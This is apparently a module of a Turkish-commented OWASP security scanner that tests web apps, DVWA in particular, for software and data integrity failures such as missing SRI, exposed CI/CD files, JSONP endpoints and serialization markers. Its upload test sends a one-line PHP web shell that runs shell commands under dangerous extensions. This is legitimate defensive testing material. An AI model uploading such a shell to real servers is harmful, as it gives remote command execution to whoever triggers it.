"""
modules/A08_DataIntegrity.py

OWASP A08:2021 – Software and Data Integrity Failures

Test stratejisi (statik analiz odaklı):
  Subresource Integrity (SRI) Yokluğu:
    - Harici CDN'den yüklenen script/link etiketlerinde integrity ve
      crossorigin niteliklerinin varlığı kontrol edilir.
  Güvensiz Dosya Yükleme:
    - DVWA /vulnerabilities/upload/ endpoint'ine tehlikeli uzantılar
      (PHP, PHTML, SHTML) gönderilir; sunucu kabul ederse bulgu oluşur.
  JSONP Endpoint Tespiti:
    - callback parametresi kabul eden endpoint'ler tespit edilir.
  CI/CD Yapılandırma Açığı:
    - .github/workflows, .gitlab-ci.yml, Jenkinsfile gibi dosyaların
      dışarıdan erişilebilir olup olmadığı kontrol edilir.
  Güvensiz Deserialization İzleri:
    - Parametre değerlerinde Base64 kodlu Java/PHP serializasyon
      başlangıç işaretleri aranır.
"""

from __future__ import annotations

import base64
import re
from typing import Any, Dict, List, Optional
from urllib.parse import urljoin, urlparse

import requests
from bs4 import BeautifulSoup

from core.base_module import BaseModule, Finding, Confidence, Severity
from core.http_client import HTTPClient
from core.llm_client import LLMClient

# ---------------------------------------------------------------------------
# Sabitler
# ---------------------------------------------------------------------------

# CI/CD ve yapılandırma dosyaları
_CICD_PATHS: list[str] = [
    "/.github/workflows/main.yml",
    "/.github/workflows/deploy.yml",
    "/.gitlab-ci.yml",
    "/Jenkinsfile",
    "/.travis.yml",
    "/circle.yml",
    "/.circleci/config.yml",
    "/Dockerfile",
    "/docker-compose.yml",
    "/Makefile",
    "/.ansible/",
    "/terraform.tfstate",
]

# Tehlikeli dosya uzantıları (upload testi)
_DANGEROUS_EXTENSIONS: list[str] = [
    "php", "php3", "php4", "php5", "php7", "phtml",
    "shtml", "phar", "asp", "aspx", "jsp",
]

# DVWA upload endpoint
_DVWA_UPLOAD_URL = "/vulnerabilities/upload/"

# Deserialization işaret desenleri
_DESERIAL_PATTERNS: list[tuple[str, re.Pattern]] = [
    ("Java serializasyonu (base64)",   re.compile(r"rO0AB[A-Za-z0-9+/=]{10,}")),
    ("PHP serialize() verisi",         re.compile(r"[OoAaSsIiBbNn]:\d+:[\"{]")),
    ("Python pickle (base64 olası)",   re.compile(r"gASV[A-Za-z0-9+/=]{10,}")),
    ("JWT Token (imzasız)",            re.compile(r"eyJ[A-Za-z0-9+/=]+\.eyJ[A-Za-z0-9+/=]+\.")),
]

# Harici CDN alan adları
_CDN_DOMAINS = frozenset([
    "cdn.jsdelivr.net", "cdnjs.cloudflare.com", "code.jquery.com",
    "stackpath.bootstrapcdn.com", "maxcdn.bootstrapcdn.com",
    "unpkg.com", "ajax.googleapis.com", "use.fontawesome.com",
])


class A08DataIntegrityModule(BaseModule):
    """OWASP A08:2021 – Software and Data Integrity Failures tarayıcı modülü."""

    OWASP_ID = "A08"
    TITLE    = "Software and Data Integrity Failures"

    def __init__(
        self,
        target: str,
        http_client: HTTPClient,
        shared_data: Optional[Dict[str, Any]] = None,
        llm_client: Optional[LLMClient] = None,
        enable_llm: bool = True,
    ) -> None:
        super().__init__(target, http_client, shared_data)
        self.llm = llm_client
        self.enable_llm = enable_llm and (llm_client is not None)

    # ------------------------------------------------------------------
    # Ana orkestrasyon
    # ------------------------------------------------------------------

    def run(self) -> List[Finding]:
        self.logger.info("A08 Data Integrity başlatılıyor → %s", self.target)
        resp = self._safe_get(self.target)
        if resp:
            self._check_sri(resp)
            self._check_deserialization_in_response(resp)

        self._check_file_upload()
        self._check_jsonp()
        self._check_cicd_exposure()
        self._check_deserialization_in_params()

        if self.enable_llm:
            self._enrich_with_llm()
        self.logger.info("A08 tamamlandı. %d bulgu.", len(self._findings))
        return self.get_findings()

    # ------------------------------------------------------------------
    # Subresource Integrity
    # ------------------------------------------------------------------

    def _check_sri(self, resp: requests.Response) -> None:
        """Harici CDN kaynaklarında SRI niteliği eksikliğini kontrol eder."""
        try:
            soup = BeautifulSoup(resp.text, "html.parser")
        except Exception:
            return

        for tag in soup.find_all(["script", "link"]):
            src = tag.get("src") or tag.get("href") or ""
            if not src:
                continue

            parsed = urlparse(src)
            # Yalnızca harici kaynaklar (CDN + başka domain)
            target_host = urlparse(self.target).netloc
            if not parsed.netloc or parsed.netloc == target_host:
                continue

            is_cdn = any(cdn in parsed.netloc for cdn in _CDN_DOMAINS)
            has_integrity = bool(tag.get("integrity"))
            has_crossorigin = bool(tag.get("crossorigin"))

            if not has_integrity:
                self._add_finding(Finding(
                    owasp_id=self.OWASP_ID,
                    title="Veri Bütünlüğü Başarısızlığı – SRI (integrity) Niteliği Eksik",
                    url=self.target,
                    parameter=tag.name,
                    payload=src[:120],
                    method="GET",
                    response_snippet=str(tag)[:200],
                    confidence=Confidence.HIGH if is_cdn else Confidence.MEDIUM,
                    severity=Severity.MEDIUM,
                    raw_details={
                        "tag": tag.name,
                        "src": src,
                        "cdn_domain": is_cdn,
                        "has_integrity": has_integrity,
                        "has_crossorigin": has_crossorigin,
                    },
                ))

    # ------------------------------------------------------------------
    # Güvensiz Dosya Yükleme
    # ------------------------------------------------------------------

    def _check_file_upload(self) -> None:
        """DVWA upload endpoint'ine tehlikeli uzantılı dosyalar gönderir."""
        upload_url = urljoin(self.target + "/", _DVWA_UPLOAD_URL.lstrip("/"))
        probe = self._safe_get(upload_url)
        if not probe or probe.status_code != 200:
            self.logger.debug("Upload endpoint erişilemez: %s", upload_url)
            return

        for ext in _DANGEROUS_EXTENSIONS:
            filename = f"test_payload.{ext}"
            fake_content = b"<?php echo shell_exec($_GET['cmd']); ?>"
            files = {"uploaded": (filename, fake_content, "image/jpeg")}
            # Dosya yükleme isteği (multipart/form-data)
            try:
                resp = self.http._session.post(
                    upload_url,
                    files=files,
                    data={"Upload": "Upload"},
                    timeout=self.http.timeout,
                    verify=False,
                )
            except Exception as exc:
                self.logger.debug("Upload testi başarısız (%s): %s", ext, exc)
                continue

            body_lower = resp.text.lower()
            # Başarılı yükleme göstergeleri
            if any(kw in body_lower for kw in ["succesfully uploaded", "successfully uploaded",
                                                 f".{ext} is not", "file uploaded"]):
                success = "succesfully uploaded" in body_lower or "successfully uploaded" in body_lower
                if success:
                    self._add_finding(Finding(
                        owasp_id=self.OWASP_ID,
                        title=f"Veri Bütünlüğü Başarısızlığı – Tehlikeli Dosya Yükleme (.{ext})",
                        url=upload_url,
                        parameter="uploaded",
                        payload=filename,
                        method="POST",
                        response_snippet=self._truncate_snippet(resp.text),
                        confidence=Confidence.HIGH,
                        severity=Severity.CRITICAL,
                        raw_details={
                            "extension": ext,
                            "filename": filename,
                            "status_code": resp.status_code,
                        },
                    ))
                    break  # İlk başarılı yükleme yeterli

    # ------------------------------------------------------------------
    # JSONP Endpoint Tespiti
    # ------------------------------------------------------------------

    def _check_jsonp(self) -> None:
        """callback parametresini kabul eden JSONP endpoint'lerini arar."""
        urls_to_check = [self.target]
        for entry in self.shared_data.get("get_params", []):
            urls_to_check.append(entry.get("url", ""))

        jsonp_callback = "alert_jsonp_test_zz99"
        for url in set(urls_to_check):
            if not url:
                continue
            for param in ("callback", "jsonp", "cb", "json_callback"):
                resp = self._safe_get(url, params={param: jsonp_callback})
                if not resp:
                    continue
                if jsonp_callback in resp.text:
                    self._add_finding(Finding(
                        owasp_id=self.OWASP_ID,
                        title="Veri Bütünlüğü Başarısızlığı – JSONP Endpoint Tespit Edildi",
                        url=url,
                        parameter=param,
                        payload=jsonp_callback,
                        method="GET",
                        response_snippet=self._truncate_snippet(resp.text),
                        confidence=Confidence.HIGH,
                        severity=Severity.MEDIUM,
                        raw_details={
                            "jsonp_param": param,
                            "callback_reflected": True,
                            "status_code": resp.status_code,
                        },
                    ))
                    break  # URL başına tek bulgu

    # ------------------------------------------------------------------
    # CI/CD Yapılandırma Açığı
    # ------------------------------------------------------------------

    def _check_cicd_exposure(self) -> None:
        """Geliştirme ve dağıtım yapılandırma dosyalarının erişilebilirliğini test eder."""
        for path in _CICD_PATHS:
            url = urljoin(self.target + "/", path.lstrip("/"))
            resp = self._safe_get(url)
            if not resp or resp.status_code != 200 or len(resp.content) < 10:
                continue

            self._add_finding(Finding(
                owasp_id=self.OWASP_ID,
                title=f"Veri Bütünlüğü Başarısızlığı – CI/CD Dosyası Erişilebilir ({path})",
                url=url,
                parameter="file_path",
                payload=path,
                method="GET",
                response_snippet=self._truncate_snippet(resp.text, max_len=200),
                confidence=Confidence.HIGH,
                severity=Severity.HIGH,
                raw_details={
                    "file": path,
                    "status_code": resp.status_code,
                    "content_length": len(resp.content),
                },
            ))

    # ------------------------------------------------------------------
    # Yanıtta Deserialization İzleri
    # ------------------------------------------------------------------

    def _check_deserialization_in_response(self, resp: requests.Response) -> None:
        """Yanıt gövdesinde serializasyon başlangıç işaretlerini arar."""
        body = resp.text
        for label, pattern in _DESERIAL_PATTERNS:
            m = pattern.search(body)
            if m:
                snippet = self._extract_context(body, m.start())
                self._add_finding(Finding(
                    owasp_id=self.OWASP_ID,
                    title=f"Veri Bütünlüğü Başarısızlığı – Deserialization İzi: {label}",
                    url=self.target,
                    parameter="response_body",
                    payload=f"Desen: {pattern.pattern[:60]}",
                    method="GET",
                    response_snippet=snippet,
                    confidence=Confidence.MEDIUM,
                    severity=Severity.HIGH,
                    raw_details={"label": label, "match_preview": m.group()[:60]},
                ))

    # ------------------------------------------------------------------
    # Parametrelerde Deserialization Kontrolü
    # ------------------------------------------------------------------

    def _check_deserialization_in_params(self) -> None:
        """GET parametrelerindeki değerlerde serializasyon işaretleri arar."""
        for entry in self.shared_data.get("get_params", []):
            url   = entry.get("url", "")
            params = entry.get("params", [])
            # Gerçek değerleri shared_data'da yoksa atlıyoruz
            for param_name in params:
                if any(kw in param_name.lower() for kw in ["data", "obj", "token", "payload", "ser"]):
                    self._add_finding(Finding(
                        owasp_id=self.OWASP_ID,
                        title="Veri Bütünlüğü Başarısızlığı – Şüpheli Serializasyon Parametresi",
                        url=url,
                        parameter=param_name,
                        payload="(parametre adı şüpheli)",
                        method="GET",
                        response_snippet=(
                            f"'{param_name}' parametresi serileştirilmiş veri taşıyor olabilir. "
                            f"Manuel doğrulama önerilir."
                        ),
                        confidence=Confidence.LOW,
                        severity=Severity.MEDIUM,
                        raw_details={"suspicious_param": param_name, "url": url},
                    ))

    # ------------------------------------------------------------------
    # Zorunlu arayüz
    # ------------------------------------------------------------------

    def _test_payloads(
        self,
        url: str,
        param: str,
        payloads: List[str],
        method: str = "GET",
        base_data: Optional[Dict[str, str]] = None,
    ) -> List[Optional[requests.Response]]:
        responses: List[Optional[requests.Response]] = []
        base = base_data.copy() if base_data else {}
        for payload in payloads:
            resp = None
            try:
                resp = self.http.get(url, params={**base, param: payload}) if method != "POST" \
                    else self.http.post(url, data={**base, param: payload})
            except Exception as exc:
                self.logger.debug("Payload başarısız [%s]: %s", param, exc)
            finally:
                responses.append(resp)
        return responses

    def _enrich_with_llm(self) -> None:
        if not self._findings or self.llm is None:
            return
        self.logger.info("A08 LLM zenginleştirme (%d bulgu)...", len(self._findings))
        for finding in self._findings:
            try:
                finding.llm_analysis = self.llm.query(finding.to_dict())
            except Exception as exc:
                finding.llm_analysis = {"llm_hatasi": True, "hata_nedeni": str(exc)}

    # ------------------------------------------------------------------
    # Yardımcılar
    # ------------------------------------------------------------------

    def _extract_context(self, text: str, pos: int, window: int = 150) -> str:
        start   = max(0, pos - window // 2)
        end     = min(len(text), pos + window // 2)
        snippet = text[start:end].strip()
        if start > 0:
            snippet = "…" + snippet
        if end < len(text):
            snippet += "…"
        return snippet

    def _truncate_snippet(self, text: str, max_len: int = 300) -> str:
        text = text.strip()
        return text[:max_len] + "…" if len(text) > max_len else text
